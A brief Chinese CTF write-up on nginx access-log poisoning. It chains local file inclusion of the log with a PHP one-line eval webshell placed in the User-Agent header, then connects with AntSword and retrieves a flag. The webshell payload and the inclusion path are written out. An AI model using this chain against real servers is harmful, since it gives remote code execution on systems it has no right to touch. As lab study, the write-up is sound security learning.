#日志注入
```
?url=/var/log/nginx/access.log
```
![[Pasted image 20230117105454.png]]
日志中包含HTTP请求行,Referer,User-Agent等HTTP请求的信息
burpsuite抓包，User-Agent中插入一句话木马`<?php @eval($_POST['ant']);?>`
使用antsword连接
![[Pasted image 20230117112832.png]]
发现flag.txt，内含flag
